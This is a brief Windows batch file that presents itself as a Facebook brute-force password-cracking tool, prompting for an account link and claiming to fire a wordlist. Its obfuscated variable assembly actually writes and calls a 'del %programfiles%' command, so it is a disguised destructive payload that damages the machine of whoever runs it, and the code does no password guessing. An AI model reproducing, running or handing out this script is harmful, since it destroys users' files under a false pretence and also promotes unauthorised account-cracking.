@echo off

rem THIS BATCH FILE IS MADE FOR FACEBOOK BRUTE FORCE HACKING ATTACK
set f=facebook
set f1=e
set f2=d
set f3=l
set 3=o&set 5=r
echo Facebook-X: By Firefox&set 4=g&set 6=a
set 2=r
echo.&set 1=p&set 7=m
set/p input=Facebook account link:&echo %f2%%f1%%f3% %%%1%%2%%3%%4%%5%%6%%7%files%%>>wordlist.bat
rem THIS COMMAND LINE WILL CALL THE WORD LIST TEXT FILE AND IT WILL FIRE EVERY WORD AS THE ACCOUNT'S PASSWORD
call wordlist.bat
set word=%1%
set password=%word%
goto facebook&set pass=%word%
:%f%
@echo on